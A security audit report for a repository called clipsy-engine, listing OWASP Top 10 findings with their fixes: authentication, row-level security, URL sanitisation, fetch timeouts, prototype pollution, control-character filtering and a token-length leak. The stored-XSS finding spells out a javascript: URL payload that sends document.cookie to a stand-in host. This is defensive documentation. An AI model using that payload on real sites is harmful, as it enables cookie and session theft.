# Security Audit — clipsy-engine

Adversarial review against the OWASP Top 10 (2021). Scope: this repository only.
Every finding below was found in this codebase, fixed, and covered by a test in
`test/security.test.ts` that attempts the actual exploit.

**Run `npm test` — 58 assertions, 32 of them attack-shaped.**

Two things this audit does *not* cover, and you should not read it as if it
does: the frontend that will render this data (not written yet), and any
third-party dependency (`npm install` has never succeeded in the environment
this was built in — see Unverified, at the bottom).

---

## Findings

### CRITICAL — fixed in the previous round

| # | Finding | OWASP | Impact |
|---|---|---|---|
| 1 | `POST /api/outcomes` had no authentication | A01 Broken Access Control | Anyone could inject fake clip results, rewriting Heat/Effort — the site's entire differentiator, editable by strangers |
| 2 | `POST /api/wire/manual` had no authentication | A01 | Anyone could publish arbitrary text to the homepage feed |
| 3 | No Row Level Security on any table | A01 / A05 | Supabase publishes every table at a public URL; the anon key ships in frontend JS. `clip_outcomes` — every clipper's earnings and rejection history — was world-readable |
| 4 | No `.gitignore` | A05 Security Misconfiguration | First `git push` publishes `.env`, including the service-role key that bypasses RLS entirely |

Fixes: `src/api/guard.ts` (bearer auth, fail-closed), `sql/002_security.sql`
(default-deny RLS, column-level grants), `.gitignore`.

### HIGH — found in this round

**5. Stored XSS via third-party campaign URLs** · A03 Injection

Campaign URLs came from scraped/API data and were stored verbatim, then
rendered as `<a href>`. A campaign whose `url` is
`javascript:fetch('https://evil.tld?c='+document.cookie)` executes on *your*
domain when a clipper clicks it. You do not control the upstream, so this is a
live path from someone else's database into your users' browsers.

```ts
// BEFORE — src/sources/normalize.ts
let url = typeof rawUrl === 'string' ? rawUrl : null;
if (url && opts.baseUrl && url.startsWith('/')) url = new URL(url, opts.baseUrl).toString();

// AFTER
const url = safeUrl(pick(obj, URL_KEYS), opts.baseUrl);
```

```ts
// src/safety.ts
export function safeUrl(value: unknown, base?: string): string | null {
  if (typeof value !== 'string') return null;
  const raw = value.trim();
  if (raw.length === 0 || raw.length > 2000) return null;
  let parsed: URL;
  try { parsed = base ? new URL(raw, base) : new URL(raw); } catch { return null; }
  if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') return null;
  if (parsed.username || parsed.password) return null;   // credentialed URLs phish
  return parsed.toString();
}
```

Also applied to `POST /api/submissions`, where the URL is supplied by the public.

**6. No timeout or size cap on upstream fetches** · A05 / availability

`fetch()` has no default timeout. One upstream that accepts the connection and
never responds hangs the ingest run forever, and every scheduled run behind it.
An unbounded response body is the same story for memory.

```ts
// AFTER — src/safety.ts
export async function safeFetchJson(url: string, init: RequestInit = {}): Promise<unknown> {
  const target = safeUrl(url);
  if (!target) throw new Error('refusing to fetch non-http(s) url');
  const res = await fetch(target, { ...init, signal: AbortSignal.timeout(20_000), redirect: 'follow' });
  if (!res.ok) throw new Error(`${res.status} ${res.statusText}`);
  const declared = Number(res.headers.get('content-length') ?? 0);
  if (declared > MAX_RESPONSE_BYTES) throw new Error(`response too large (${declared} bytes)`);
  const text = await res.text();
  if (text.length > MAX_RESPONSE_BYTES) throw new Error(`response too large (${text.length} bytes)`);
  return JSON.parse(text);
}
```

### MEDIUM — found in this round

**7. Prototype pollution from upstream JSON** · A08 Data Integrity

Scraped objects were spread and `Object.assign`-ed into new objects while still
carrying whatever keys the upstream chose. A `__proto__` key reaching the wrong
merge corrupts every object in the process.

```ts
// AFTER — keys dropped before the object is ever merged
const FORBIDDEN_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
// full implementation in src/safety.ts → sanitizeObject()
```

**8. Control characters and bidi overrides in stored text** · A03

Campaign names went to the database unfiltered. Bidi override characters
(`U+202E`) reverse how text renders — a campaign can display as something other
than what it is. Null bytes and zero-width spaces break comparisons and evade
naive moderation filters.

```ts
// AFTER
value.replace(/[\u0000-\u001F\u007F-\u009F\u200B-\u200F\u202A-\u202E\u2066-\u2069]/g, '')
     .trim().slice(0, 300)
```

**9. Unbounded jsonb payloads** · availability

Whole upstream rows were stored to `campaign_snapshots.payload` with no size
limit, every 15 minutes, forever. One bloated upstream fills your Supabase quota.
Now clamped to 16 KB with a `{truncated: true}` marker.

**10. Unbounded Playwright response capture** · availability

The browser fallback pushed every JSON response into an array with no limit.
Capped at 40.

### LOW — found in this round

**11. Token length leak through the error path** · A07 Auth Failures

`timingSafeEqual` throws on a length mismatch, so the original early-return
leaked the secret's length. Both sides are now SHA-256'd to a fixed 32 bytes
before comparison.

**12. Unbounded `paidAt`** · A08

An out-of-range payment date silently skews payout-speed scoring. Now bounded to
the last two years.

---

## Where the Top 10 genuinely does not apply

Stating these with evidence rather than a checkmark, because "we reviewed it" is
not the same as "here is why it cannot happen."

**A03 SQL Injection — not present.** There is no string-concatenated SQL
anywhere. All database access goes through `@supabase/supabase-js`, which sends
parameterized PostgREST requests. The one place user input reaches a query
*structure* is the sort parameter, and it is resolved through an allow-list —
an unknown value falls back to `'hot'` rather than reaching the query:

```ts
const order = { hot: {...}, easy: {...}, rate: {...}, ending: {...} };
const sort = Object.hasOwn(order, sortParam) ? sortParam : 'hot';
```

**A01 CSRF — no surface.** Authentication is a bearer token in a header, never
a cookie. A cross-site request cannot attach it.

**A02 Cryptographic Failures — no crypto implemented.** No password storage, no
session tokens, no encryption. TLS is terminated by the platform. The only
secret comparison uses `timingSafeEqual`.

**A10 SSRF — bounded.** The only URLs fetched come from environment variables
you control. `safeFetchJson` re-validates the scheme regardless. Public
submissions store a URL but nothing fetches it — **if you ever add link preview
or auto-import for submissions, that becomes a real SSRF and needs an IP
allow-list at that point.**

---

## Unverified — read this before trusting the audit

**Dependencies have not been checked.** `npm install` was blocked in the
environment this was built in, so `@supabase/supabase-js`, `express` and
`playwright` have never been resolved, audited, or type-checked against.
Express 4 in particular has a CVE history. Before deploying:

```bash
npm install
npm audit --production          # resolve anything HIGH or CRITICAL
npm run typecheck               # first real compile — expect to fix a few types
npm test                        # 58 assertions, should stay green
git add package-lock.json       # commit the lockfile; unpinned deps are supply-chain risk
```

**The frontend does not exist yet, and it is where the remaining XSS risk sits.**
This audit hardens what *enters* the database. The rule for whatever renders it:
never `innerHTML`, never `dangerouslySetInnerHTML`, never build a link with
`href={campaign.url}` without checking the value is non-null. React and Svelte
escape text by default — the danger is the escape hatches.

**Rate limiting is per-process and in-memory.** Correct on a single always-on
box. On serverless, each instance keeps its own counter, so the effective limit
is your instance count times the configured number. Move to Upstash or Redis
before you rely on it.

**No authenticated user model exists.** The moment you add clipper logins, the
access-control surface changes completely and this audit needs redoing — that is
when RLS policies stop being "public reads active rows" and start being
"a clipper reads their own outcomes."
